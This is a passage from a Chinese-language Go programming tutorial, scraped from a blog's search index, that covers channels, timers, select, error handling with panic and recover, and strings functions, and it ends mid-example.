fmt.Printf(\u0026#34;sub-goroutine [%d], len(ch)=%d, cap(ch)=%d\\n\u0026#34;, i, len(ch), cap(ch)) ch \u0026lt;- i // 管道中一次性可以放入3个东西 } }() time.Sleep(time.Second * 2) for i := 0; i \u0026lt; 3; i++ { num := \u0026lt;-ch // 从管道中也可以一次性取 3 个东西 fmt.Println(\u0026#34;main-goroutine, num=\u0026#34;, num) } } /* 运行结果： len(ch)=0, cap(ch)=3 sub-goroutine [0], len(ch)=1, cap(ch)=3 sub-goroutine [1], len(ch)=2, cap(ch)=3 sub-goroutine [2], len(ch)=3, cap(ch)=3 main-goroutine, num= 0 main-goroutine, num= 1 main-goroutine, num= 2 */ 4.7 两个类型 channel 的总结 1.无缓冲的通道保证进行发送和接收的 goroutine 会在同一时间进行数据交互；有缓冲的通道没有这样的保证。 2.无缓冲通道，发送方会阻塞直到接收方从通道中接收了值。 3.有缓冲的通道允许发送端的数据发送和接收端的数据获取处于异步状态，发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。 4.由于缓冲区的大小是有限的，所以还是必须要有接收端来接收数据。否则缓冲区一满，发送端就无法再发送数据了。 5.有缓冲的通道，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。 6.有缓冲的通道，只要通道没满，放几个就可以拿几个。通道满了，就必须取出一个才能继续往里面放数据。\n4.8 关闭 channel 内部能够检查到通道是否被关闭了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 func main() { ch := make(chan int) go func() { for i := 0; i \u0026lt; 5; i++ { ch \u0026lt;- i } // 没有数据写入通道时，必须关闭通道 // 不然调用者接收不到数据就会引发死锁错误 close(ch) }() // 不需要再指定 5 次了，通过判断通道是否被关闭来结束程序 for { // 如果 ok 为 true，表明管道没有被关闭 if num, ok := \u0026lt;-ch; ok { fmt.Println(\u0026#34;num=\u0026#34;, num) } else { fmt.Println(\u0026#34;channel has been closed.\u0026#34;) break } } } /* 运行结果： num= 0 num= 1 num= 2 num= 3 num= 4 channel has been closed. */ 注意事项： 1.channel 不像文件那样需要经常关闭，只有当确定没有任何发送数据了，或者想显示地结束 range 循环之类的采取关闭 channel。 2.关闭 channel 后，无法再向 channel 发送数据，否则引发 panic 错误且导致接收立即返回零值。 3.管道关闭后，可以继续向 channel 接收数据。 4.对于 nil 的 channel，无论收发都会被永久阻塞，引发死锁错误。\n4.9 通过range遍历channel 更加简便，遍历时检测到管道被关闭了，就自动跳出循环。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func main() { ch := make(chan int, 1) go func() { for i := 0; i \u0026lt; 5; i++ { ch \u0026lt;- i } // 没有数据写入通道时，必须关闭通道 // 不然其他goroutine接收不到数据就会引发死锁错误 close(ch) }() // 无需显示判断，遍历channel时会自动检测，如果管道被关闭了，则自动跳出循环 for num := range ch { fmt.Println(\u0026#34;num=\u0026#34;, num) } } /* 运行结果： num= 0 num= 1 num= 2 num= 3 num= 4 */ 4.10 单向channel 管道默认是双向的，可读可写。\n4.10.1 单向channel变量的声明 就看 \u0026lt;- 箭头放在 chan 这个关键字的哪一边。 没放就是普通的双向通道，放在左边是只读（\u0026lt;-ch 表示取数据），放在右边是只写（ch\u0026lt;- 表示放入数据）。\n1 2 3 var ch1 chan int // 正常的双向通道 var ch2 chan\u0026lt;- float64 // 单向channel，只用于写float64数据 var ch3 \u0026lt;-chan int // 单向channel，只用于读取int数据 4.10.2 单向 channel 的特点 1.可以将普通的双向通道隐式转换为单向通道，不能将单向通道转换为普通的双向通道。 2.只写的只做写入数据的事情，只读的只做取数据的事情。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func main() { // 普通的双向通道 ch1 := make(chan int) var writeCh chan\u0026lt;- int = ch1 writeCh \u0026lt;- 999 \u0026lt;-writeCh // 报错：invalid operation: \u0026lt;-writeCh (receive from send-only type chan\u0026lt;- int) var readCh \u0026lt;-chan int = ch1 \u0026lt;-readCh readCh \u0026lt;- 999 // 报错：invalid operation: readCh \u0026lt;- 999 (send to receive-only type \u0026lt;-chan int) var ch2 chan int ch2 = writeCh // 报错：cannot use writeCh (type chan\u0026lt;- int) as type chan int in assignment } 4.10.3 单向 channel 的应用 生产者\u0026amp;消费者模型：生产一个消费一个。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 func producer(write chan\u0026lt;- int) { // 此通道只写，不能读取 for i := 0; i \u0026lt; 10; i++ { write \u0026lt;- i * i } } func consumer(read \u0026lt;-chan int) { // 此通道只读，不能写入 for data := range read { fmt.Println(\u0026#34;consumer, data=\u0026#34;, data) } } func main() { ch := make(chan int) // 生产者，生产数字并放入管道 go producer(ch) //channel是引用传递(传址) // 消费者，从channel中读取数字并打印消费 go consumer(ch) //channel是引用传递(传址) // 为了不让主协程退出，特意写了死循环 for { } } /* 运行结果： consumer, data= 0 consumer, data= 1 consumer, data= 4 consumer, data= 9 consumer, data= 16 consumer, data= 25 consumer, data= 36 consumer, data= 49 consumer, data= 64 consumer, data= 81 Process finished with exit code 2 */ 取数据的时候，没有数据就会在那边阻塞。等0*0放入管道的时候，内部立马检测到了有数据可以去取，才能去取到数据并打印出来。以此类推循环 10 次：放入一个，读取一个。\n五、定时器 5.1 Timer Timer是一个定时器，代表未来的一个单一事件。告诉timer需要等待多长时间，它提供了一个channel，时间到往这个channel写入当前的时间值。\n5.1.1 创建一个 Timer 需要用到内建的 time 包。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { fmt.Println(\u0026#34;current time:\u0026#34;, time.Now()) // 创建一个Timer，设定2秒。2秒后，往timer通道发送当前的时间值（当前时间） timer := time.NewTimer(2 * time.Second) // 2 秒后会往timer通道写入数据 // 需要手动地显示地获取数据，不写这行代码就不会产生延时效果 t := \u0026lt;-timer.C // .C 表示读取数据，没有数据写入之前会阻塞在这里 fmt.Println(\u0026#34;t=\u0026#34;, t) } /* 运行结果： current time: 2020-02-22 10:22:14.3789342 +0800 CST m=+0.001995101 t= 2020-02-22 10:22:16.3890326 +0800 CST m=+2.012093501 */ NewTimer() 是过一段时间后，往管道中写入数据。如果没有显示地 \u0026lt;- 去取数据，内部检测不到取数据的操作，既然你不想要拿数据，那它也就不会往管道里放数据了。有了取值操作 \u0026lt;-，内部就知道你想要过一段时间后，从管道中取数据，定时器才会生效。\n5.1.2 Timer 只会产生一次事件 Timer只会响应一次。时间到了，只会产生一次事件，只会写入一次数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { timer := time.NewTimer(time.Second) for i := 0; i \u0026lt; 10; i++ { \u0026lt;-timer.C // 报错：死锁错误 fmt.Println(\u0026#34;时间到\u0026#34;) } } /* 运行结果： 时间到 fatal error: all goroutines are asleep - deadlock! goroutine 1 [chan receive]: main.main() F:/goProject/src/myTest/main.go:11 +0x54 Process finished with exit code 2 */ 只写入了一次数据，那也只能拿到一次数据。第二次开始一直阻塞在取数据的地方，程序永远不会往下走，引发死锁错误。\n5.1.3 Timer 实现延时功能 有3种方式可以实现延时功能：Sleep(), time.NewTimer(), time.After() 示例1：Sleep()，最简单粗暴的方式\n1 2 3 4 5 6 7 8 9 10 11 func main() { fmt.Println(\u0026#34;当前时间：\u0026#34;, time.Now()) time.Sleep(2 * time.Second) fmt.Println(\u0026#34;时间到，当前时间：\u0026#34;, time.Now()) } /* 运行结果： 当前时间： 2020-02-22 10:38:33.8267119 +0800 CST m=+0.001994701 时间到，当前时间： 2020-02-22 10:38:35.8363347 +0800 CST m=+2.011617501 */ 示例2：time.NewTimer()，会产生一个值写入管道 C，需要手动从管道 C 中接收时间值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { fmt.Println(\u0026#34;当前时间：\u0026#34;, time.Now()) timer := time.NewTimer(2 * time.Second) // 没有这行语句，就不会有延时效果 t := \u0026lt;-timer.C // 内部会把延时后的当前时间写入管道C中，需要手动\u0026lt;-从管道C中读取出来 fmt.Println(\u0026#34;时间到，当前时间：\u0026#34;, t) } /* 运行结果： 当前时间： 2020-02-22 10:42:10.0294307 +0800 CST m=+0.001995601 时间到，当前时间： 2020-02-22 10:42:12.0387286 +0800 CST m=+2.011293501 */ 示例3：time.After()，常用于超时处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func main() { fmt.Println(\u0026#34;当前时间：\u0026#34;, time.Now()) // 设置 2 秒延时，阻塞 2 秒。2 秒后产生一个事件（就是往管道里写入延时后的当前时间） // 直接使用\u0026lt;-操作符取值即可 t := \u0026lt;-time.After(2 * time.Second) // 没有 \u0026lt;- 去取值，就不会有延时的效果，不要忘了写上 fmt.Println(\u0026#34;时间到，当前时间：\u0026#34;, t) } /* 运行结果： 当前时间： 2020-02-22 11:02:20.2412903 +0800 CST m=+0.001994901 时间到，当前时间： 2020-02-22 11:02:22.2522149 +0800 CST m=+2.012919501 */ 5.1.4 Timer注意事项 Timer 需要手动地显示地使用操作符 \u0026lt;- 去管道 C 中接收数据，否则就不会有延时的效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { fmt.Println(\u0026#34;当前时间：\u0026#34;, time.Now()) timer := time.NewTimer(2 * time.Second) //t := \u0026lt;-timer.C //内部会把延时后的当前时间写入管道C中，需要手动从管道C中读取出来 fmt.Println(\u0026#34;timer=\u0026#34;, timer) fmt.Println(\u0026#34;时间到，当前时间：\u0026#34;, time.Now()) } /* 运行结果： 当前时间： 2020-02-22 10:47:51.8096677 +0800 CST m=+0.001994301 timer= \u0026amp;{0xc0000ae000 {5797568 0 432376605941300 0 0x491d10 0xc0000ae000 0}} 时间到，当前时间： 2020-02-22 10:47:51.8176459 +0800 CST m=+0.009972501 */ 上例中，根本没有预期的 2 秒钟的延时。 个人自己猜测了一下原因：操作符 \u0026lt;- 取值时，没有数据的时候是会阻塞的。计时器是时间到了，就把当前时间将往管道 C 中发送。如果没有操作符 \u0026lt;- 去取值，Golang 内部会认为你不要这个值，既然你不要这个值，那我为什么还要费力等一段时间后再往管道中放入数据？ timer.C 手动地显示地获取一下，就实现效果了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func main() { fmt.Println(\u0026#34;当前时间：\u0026#34;, time.Now()) timer := time.NewTimer(2 * time.Second) t := \u0026lt;-timer.C // 内部会把延时后的当前时间写入管道C中，需要手动从管道C中读取出来 fmt.Println(\u0026#34;时间到，当前时间：\u0026#34;, t) } /* 运行结果： 当前时间： 2020-02-22 10:56:08.9670945 +0800 CST m=+0.001995701 时间到，当前时间： 2020-02-22 10:56:10.9765383 +0800 CST m=+2.011439501 */ 5.1.5 Timer停止 timer.Stop() 将定时器停止、作废，使定时器失效。 示例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 func main() { fmt.Println(\u0026#34;current time:\u0026#34;, time.Now()) timer := time.NewTimer(2 * time.Second) go func() { \u0026lt;-timer.C fmt.Println(\u0026#34;定时器时间到，子协程可以打印了. current time:\u0026#34;, time.Now()) }() timer.Stop() // 停止定时器，定时器无效了 for { fmt.Println(\u0026#34;1\u0026#34;) time.Sleep(2 * time.Second) } } /* 运行结果： current time: 2020-02-22 15:07:58.7841598 +0800 CST m=+0.001995101 1 1 1 1 1 Process finished with exit code 2 */ 上例中：主协程中让定时器失效，定时器永远不会往子协程中的管道 C 发送数据。主协程和子协程是两个独立的任务：主协程只是个死循环，调度器调度主协程时，每隔2秒无限打印。而调度子协程时，因为没有任何数据可以接收到，所以就一直阻塞在 \u0026lt;-timer.C 那里。个人猜想，因为有两个任务在不停切换，所以它并不会引发死锁错误。 示例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func main() { fmt.Println(\u0026#34;current time:\u0026#34;, time.Now()) timer := time.NewTimer(2 * time.Second) timer.Stop() // 停止定时器，定时器无效了 t := \u0026lt;-timer.C // 定时器在这之前就已失效，就接收不到任何值了，永远阻塞在此，引发死锁错误 fmt.Println(\u0026#34;定时器时间到. t=\u0026#34;, t) } /* 运行结果： current time: 2020-02-22 15:00:37.0752347 +0800 CST m=+0.001987401 fatal error: all goroutines are asleep - deadlock! goroutine 1 [chan receive]: main.main() F:/goProject/src/myTest/main.go:13 +0x154 Process finished with exit code 2 */ 上例中，可能因为只有一条主协程的原因，而引发了死锁错误。\n5.1.6 Timer重置 timer.Reset() 重新设定一个 Timer 的过期时间，会把之前设定的时间给覆盖掉。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { fmt.Println(\u0026#34;current time:\u0026#34;, time.Now()) timer := time.NewTimer(5 * time.Second) timer.Reset(time.Second) // 重新设定为1秒钟过期，会覆盖原有的时间限定 \u0026lt;-timer.C // 取值，为了让它阻塞在此 fmt.Println(\u0026#34;时间到，current time:\u0026#34;, time.Now()) } /* 运行结果： current time: 2020-02-22 14:54:52.7534029 +0800 CST m=+0.001994501 时间到，current time: 2020-02-22 14:54:53.7637002 +0800 CST m=+1.012291801 */ 5.2 Ticker Ticker 是一个定时触发的计时器，它会以一个间隔 interval 往 channel 发送一个事件(当前时间)，channel 的接收者可以以固定的时间间隔从 channel 中读取事件(当前时间)。 Ticker 是时间到就产生一个事件，一直如此循环。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func main() { // 定义一个Ticker，每隔2秒循环一个事件(往管道C中写入当前时间值) ticker := time.NewTicker(2 * time.Second) i := 0 for { i++ fmt.Println(\u0026#34;current time:\u0026#34;, \u0026lt;-ticker.C) // 从管道C中读取事件(当前时间)，不然计时器无法生效 // i=5 的时候，计时器停止，并退出循环。退出循环后，没有接下来的代码了，就是结束程序了 if i == 5 { ticker.Stop() break } } } /* 运行结果： current time: 2020-02-22 15:27:03.2978298 +0800 CST m=+2.002727901 current time: 2020-02-22 15:27:05.2976192 +0800 CST m=+4.002517301 current time: 2020-02-22 15:27:07.2972701 +0800 CST m=+6.002168201 current time: 2020-02-22 15:27:09.2989453 +0800 CST m=+8.003843401 current time: 2020-02-22 15:27:11.2977031 +0800 CST m=+10.002601201 */ 5.3 Timer和Ticker区别 Timer 时间到了，只会产生一次事件。 Ticker 会循环产生事件。\n六、select 通过 select 可以监听 channel 上的数据流动（数据流动方向），用来处理异步 IO。特别注意：select 中，每个 case 语句都必须是一个 IO 操作。 在一个 select 语句块中，Golang 会按顺序从头到尾评估每一个发送和接收的语句。如果其中的任意一条语句可以继续执行（即没有阻塞），那么就从那些可以执行的语句中任意选择一条来使用。 如果没有任意一条语句可以执行（即所有的通道都被阻塞），那么有两种情况： 1.如果给出了 default 语句，那么就会执行 default 语句，同时程序的执行会从 select 语句后的语句中恢复。 2.如果没有 default 语句，那么 select 语句将被阻塞，直到至少一个通信到达后，才会执行下去。\n6.1 select 大致结构 1 2 3 4 5 6 7 8 select { case \u0026lt;-chan1: //如果chan1成功读到数据，则进入本条case语句 case chan2 \u0026lt;- 111: //如果成功向chan2写入数据，则进入本条case语句 default: //如果上面都没有成功，则进入default语句 } 6.1.1 注意事项1 写入数据成功指的是数据写入了，并且有读取了它。 向管道中写入数据未必能够写成功！向管道中写入数据，那么就必须要有个地方可以拿取它。有写入，且有个地方读取了，那么才算是写入成功！ 反面案例：写入了，只是表明有写的这个操作，而不代表写成功的结果！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func main() { ch := make(chan int) go func() { fmt.Println(\u0026#34;this is a sub-goroutine\u0026#34;) ch \u0026lt;- 666 }() // 为了不让主协程退出，特意写了一个死循环放在这里 for { } } /* 运行结果： this is a sub-goroutine Process finished with exit code 2 */ 下例是写成功的案例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { ch := make(chan int) go func() { fmt.Println(\u0026#34;this is a sub-goroutine\u0026#34;) ch \u0026lt;- 666 }() value := \u0026lt;-ch fmt.Println(\u0026#34;get value from ch, value=\u0026#34;, value) } /* 运行结果： this is a sub-goroutine get value from ch, value= 666 */ 6.1.2 注意事项2 1.select 中的每个 case 语句里必须是一个 IO 操作。 2.不能像 switch 语句中的 case 那样写逻辑运算符，比如 \u0026lt; \u0026gt; == !=\n6.2 使用 select 实现斐波那契数列 使用生产者消费者模型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 // 生产者函数，不停地生产数字，并放入管道中去 // ch管道只写，quit管道只读 func fibo(ch chan\u0026lt;- int, quit \u0026lt;-chan bool) { x, y := 1, 1 for { select { // 这里，生产者会一直生产数字。 // 当消费者未消费满10个的时候。quit管道是空的，不会接收到数据，由于是无缓冲通道，下面case语句的quit管道就会发生阻塞。Golang内部选择本条case语句。 // 当消费者消费满了10个后，消费者那边就不再从管道里取数字了。由于是无缓冲通道，消费者那边不取数字，这里把数字放入管道的时候就会发生阻塞。 // 这里发送阻塞的时候，由于下面一条case收到了quit管道中放入了数据这一个信息，而且也从quit管道中去读取数据了。 // 那边放入，这里取出，完成了写入成功。下面一条的case就不再阻塞了。 // 这条case阻塞，下面那条case不阻塞，内部就会立马选择下面那条case语句。 case ch \u0026lt;- x: // x的值放入管道中 x, y = y, x+y // 消费者未消费满10个之前，quit管道是空的。只要通道是空的，没有数据，这里就会阻塞。Golang内部会选择上面那条case语句。 // 当消费满10个了，消费者那边会往quit管道中放入一个值。 一旦放入了值，Golang内部就能立马检测到有数据发送过来了，而且这里也执行了取数据的操作。 // 由于消费满10个之后，消费者那边不取值了，因为管道没有缓冲区，上面那条case语句就会阻塞。 // 上面的case阻塞，这里的case即有数据放入也有取值操作，所以不再阻塞了，Golang内部选择本条case语句。 case flag := \u0026lt;-quit: fmt.Println(\u0026#34;got quit command. flag=\u0026#34;, flag) return // 终止整个函数 } } } func main() { ch := make(chan int) // 数字通信的管道 quit := make(chan bool) // 标记是否退出 // 生产者，产生数字并放入管道中，同时检测是否有退出指令写入 // 新建一个子协程 go fibo(ch, quit) // 消费者匿名函数，从管道中读取数字 // 让主协程让处理这个消费者的任务 func() { // 我只要消费10个就够了 for i := 0; i \u0026lt; 10; i++ { num := \u0026lt;-ch // ch\u0026lt;-x 数据放入管道的时候，这里没有读出来的时候，还是会阻塞在这里。只是 CPU 执行速度实在太快，一放一读几乎瞬间完成，人类的肉眼看不出阻塞的现象 fmt.Println(num) } quit \u0026lt;- true // 消费完后，给 quit 管道写入数据 }() } /* 运行结果： 1 1 2 3 5 8 13 21 34 55 got quit command. flag= true */ 6.3 select实现超时机制 有时候会出现 goroutine 阻塞的情况，如何避免整个程序陷入阻塞的情况？可以利用 select 来设置延时。 比如登陆网银后，一段时间不操作，就自动退出登陆状态了，这就是超时机制。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 func main() { fmt.Println(\u0026#34;current time:\u0026#34;, time.Now()) ch := make(chan int) // 无缓冲的双向管道，可读可写 quit := make(chan bool) // 是否已退出的标记 // 新建一个子协程 go func() { // 不停地检测两个管道中的数据流动放向 for { select { // 另外一个子协程每隔1秒往ch管道中放入数据，一旦放入数据，Golang内部就能立马检测到这一信息，这里便能读取出数据。 // 能读取出数据，数据就是在流动的，这里就不会阻塞。 case num := \u0026lt;-ch: fmt.Println(\u0026#34;num=\u0026#34;, num) // 3 秒后，定时器触发事件。在此之前，定时器没有触发，都是处于阻塞状态。 // 5 个放完后就不再往ch管道中放数据了，而是给quit管道放入了一个数据。此时上面case接收不到数据，上面的case就会阻塞。 // 上面一直阻塞着，阻塞了3秒钟后，定时器被触发了，打印信息，并往quit管道中发送数据。 case \u0026lt;-time.After(3 * time.Second): // 和Sleep()是同时在发生的 fmt.Println(\u0026#34;已超时.\u0026#34;) quit \u0026lt;- true } } }() // 新建另一个子协程，用来往ch管道中放入数据 go func() { // 每隔 1 秒，往 ch 管道中放入数据 for i := 0; i \u0026lt; 5; i++ { ch \u0026lt;- i time.Sleep(time.Second) } fmt.Println(\u0026#34;sub-goroutine, loop finished. current time:\u0026#34;, time.Now()) }() // 主协程在没有数据放入quit管道之前，就阻塞在这里。 // 一旦有数据放入管道中，Golang检测到了，并读取到了，这里才不会阻塞。 q := \u0026lt;-quit fmt.Println(\u0026#34;current time:\u0026#34;, time.Now()) fmt.Println(\u0026#34;got quit command, system quit. quit=\u0026#34;, q) } /* 运行结果： current time: 2020-02-23 10:53:12.2591937 +0800 CST m=+0.002025201 num= 0 num= 1 num= 2 num= 3 num= 4 sub-goroutine, loop finished. current time: 2020-02-23 10:53:17.2709789 +0800 CST m=+5.013810401 已超时. current time: 2020-02-23 10:53:19.2717308 +0800 CST m=+7.014562301 got quit command, system quit. quit= true Process finished with exit code 0 */ 总共用了7秒是因为：当最后一次往 ch 管道放入数据后（放入后子协程会去执行睡1秒的操作），\u0026lt;-ch 接收完了这个数据，就再也接收不到其他任何数据了，就处于阻塞的状态了。5次for循环确实是用了5秒，当子协程在睡1秒的同时，定时器也开始从3秒倒计时了，此时倒计时3秒和睡1秒是同时在发生的事情。睡了1秒之后，定时器也只剩下了2秒。总耗时：5秒+2秒\u0026gt;7秒，因为程序执行也是需要耗费时间的。 注：Golang 的 time.Now() 是以纳秒（十亿分之一秒）来呈现。\n6.4 使用 select 输出几个偶数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func main() { ch := make(chan int, 1) // 缓冲区大小为1，要么是空的，要么是满的 for i := 0; i \u0026lt; 10; i++ { select { case x := \u0026lt;-ch: // 缓冲区中有数据了，才会选择这个分支 fmt.Printf(\u0026#34;%d \u0026#34;, x) case ch \u0026lt;- i: // 缓冲区空的时候，才会选择这个分支 // do nothing } } } /* 运行结果： 0 2 4 6 8 */ ","date":"2021-01-10T09:36:55Z","image":"https://w.wallhaven.cc/full/2y/wallhaven-2y2or6.png","permalink":"https://360rce.github.io/p/1ypylhrh/","title":"Golang学习之并发编程"},{"content":"一、异常处理 1.1 error接口 error接口是Golang内建的接口类型，实现了一个错误处理的标准模式。返回一个不是致命的错误，主要起到一个提示作用。\n1.1.1 error接口的基本使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import ( \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; ) func main() { //fmt包中的Errorf函数 err1 := fmt.Errorf(\u0026#34;%s\u0026#34;, \u0026#34;this is error1.\u0026#34;) fmt.Printf(\u0026#34;err1 type is : %T, err1=%+v\\n\u0026#34;, err1, err1) //errors包中的New()函数 err2 := errors.New(\u0026#34;this is error2.\u0026#34;) fmt.Printf(\u0026#34;err2 type is : %T, err2=%+v\\n\u0026#34;, err2, err2) } /* 运行结果： err1 type is : *errors.errorString, err1=this is error1. err2 type is : *errors.errorString, err2=this is error2. */ 1.1.2 error接口的应用 error接口一般用于程序发生错误时，给予提示信息的作用： 下例演示：当分母为0时，打印一个提示信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import ( \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; ) func MyDiv(a, b int) (result int, err error) { //error是接口类型，使用这个接口 err = nil if b == 0 { err = errors.New(\u0026#34;分母不能为0\u0026#34;) } else { result = a / b } return } func main() { for i, j := 10, 2; j \u0026gt; -2; j-- { result, err := MyDiv(i, j) if err != nil { fmt.Println(\u0026#34;error:\u0026#34;, err) } else { fmt.Println(\u0026#34;result=\u0026#34;, result) } } } /* 运行结果： result= 5 result= 10 error: 分母不能为0 result= -10 */ 这个error只是打印一个信息，并不是程序报错，所以能够正常运行完成。\n1.2 panic 当遇到不可恢复的错误状态的时候，如：数组访问越界、空指针引用等，这些运行时的致命错误，就会引发panic异常。 当panic异常引发时，程序就会中断运行。随后，程序崩溃并输出日志信息，日志信息包括panic value和函数调用的堆栈跟踪信息。 不是所有的panic异常都来自运行时（运行时发生了致命错误，程序内部会自动调用panic()函数，让程序中断并崩溃）。直接调用内建的panic()函数也会引发异常（手动引发异常）。panic()函数接收任意值作为参数。\n1.2.1 人为引发panic 手动显式调用panic()函数，就是人为引发的异常，导致程序中断崩溃：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 func testa() { fmt.Println(\u0026#34;aaaaaaaa\u0026#34;) } func testb() { //显式调用panic函数，引发异常，导致程序中断并且崩溃 panic(\u0026#34;this is a panic test.\u0026#34;) } func testc() { fmt.Println(\u0026#34;cccccccc\u0026#34;) } func main() { testa() testb() testc() } /* 运行结果： aaaaaaaa panic: this is a panic test. goroutine 1 [running]: main.testb(...) F:/goProject/src/myTest/main.go:11 main.main() F:/goProject/src/myTest/main.go:20 +0x9d Process finished with exit code 2 */ 1.2.2 内部检测机制自动引发的panic 数组访问越界，内部自动引发异常：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func testa() { fmt.Println(\u0026#34;aaaaaaaa\u0026#34;) } func testb() { var a = [2]int{1, 2} //定义一个长度为2的数组 for i := 0; i \u0026lt; 3; i++ { fmt.Println(\u0026#34;testb, i=\u0026#34;, a[i]) //当i=2的时候，数组访问越界，内部会自动检测到并引发panic } } func testc() { fmt.Println(\u0026#34;cccccccc\u0026#34;) } func main() { testa() testb() testc() } 1.3 recover recover 是一个专用于\u0026quot;拦截\u0026quot;运行时 panic 的内建函数。当前程序运行时发生了 panic，recover 可以从 panic 的状态中恢复并重新获得流程控制权。简而言之：从 panic 的崩溃处恢复运行程序，它不会引发程序崩溃。 recover 有一个返回值：如果引发了 panic，则返回对应的错误信息；如果未引发 panic，则返回 nil。 recover 必须在 defer 调用的函数中有效。\n1.3.1 recover的基本使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 func testa() { fmt.Println(\u0026#34;aaaaaaaa\u0026#34;) } func testb() { //recover()需要放在defer语句的函数调用中 defer func() { //recover有一个返回值：当有panic时，返回对应的错误信息；没有panic时，返回nil if err := recover(); err != nil { //没有panic时，返回nil。nil != nil 条件不成立，不会进if语句 fmt.Println(err) //打印错误信息，不要再写recover()了。if初始化语句中已经得到了错误信息并恢复了运行，因为后面没有任何panic的引发，所以再写recover()就会打印出nil } }() //匿名函数调用，满足defer语句中的函数调用，这一条件 var a = [2]int{1, 2} //定义一个长度为2的数组 for i := 0; i \u0026lt; 3; i++ { fmt.Println(\u0026#34;testb, i=\u0026#34;, a[i]) //当i=2的时候，数组访问越界，内部会自动检测到并引发panic } } func testc() { fmt.Println(\u0026#34;cccccccc\u0026#34;) } func main() { testa() testb() testc() } /* 运行结果： aaaaaaaa testb, i= 1 testb, i= 2 runtime error: index out of range [2] with length 2 cccccccc */ 1.3.2 recover不能在defer中直接调用 recover不能在defer中直接调用，recover需要在defer调用的函数里才能生效。\n1.3.3 recover正确的使用方式 defer后面接一个函数，在函数里写recover()，然后调用这个函数，才能使recover()生效。 例如，打印一下错误信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 defer func() { fmt.Println(recover()) }() //调用匿名函数 123 ​```go `recover()`放在匿名函数中，匿名函数当然是一个函数，而且它接着`defer`语句，最后加了一对小括号`()`完成对匿名函数的调用。 ## 二、字符串处理 ### 2.1 字符串常用操作 以下函数都是在`strings`包中，使用前必须先导入`strings`包！ #### 2.1.1 Contains函数 语法：`func Contains(s, substr string) bool`，验证字符串s中是否包含了substr。 完全匹配，一个字符都不能差！ 示例： ​```go func main() { fmt.Println(strings.Contains(\u0026#34;hello,go\u0026#34;, \u0026#34;go\u0026#34;)) fmt.Println(strings.Contains(\u0026#34;hello,go\u0026#34;, \u0026#34;ol\u0026#34;)) } /* 运行结果： true false */ 2.1.2 Join函数 语法：func Join(a []string, sep string) string，字符串链接，把slice a通过sep链接起来。 示例：\n1 2 3 4 5 6 7 8 9 10 func main() { sli := []string{\u0026#34;go\u0026#34;, \u0026#34;python\u0026#34;, \u0026#34;rust\u0026#34;} newStr := strings.Join(sli, \u0026#34;@\u0026#34;) fmt.Println(\u0026#34;newStr=\u0026#34;, newStr) } /* 运行结果： newStr= go@python@rust */ 2.1.3 Index函数 语法：func Index(s, sep string) int，在字符串s中查找sep的位置，返回sep的下标，找不到返回-1。 完全匹配，一个字符都不能差！返回的是第一个找到的下标！ 示例：\n1 2 3 4 5 6 7 8 9 10 func main() { fmt.Println(\u0026#34;index:\u0026#34;, strings.Index(\u0026#34;abchehe\u0026#34;, \u0026#34;he\u0026#34;)) fmt.Println(\u0026#34;index:\u0026#34;, strings.Index(\u0026#34;abchehe\u0026#34;, \u0026#34;bd\u0026#34;)) } /* 运行结果： index: 3 index: -1 */ 2.1.4 Repeat函数 语法：func Repeat(s string, count int) string，重复s字符串count次，返回最终的字符串。 示例：\n1 2 3 4 5 6 7 8 9 func main() { newStr := 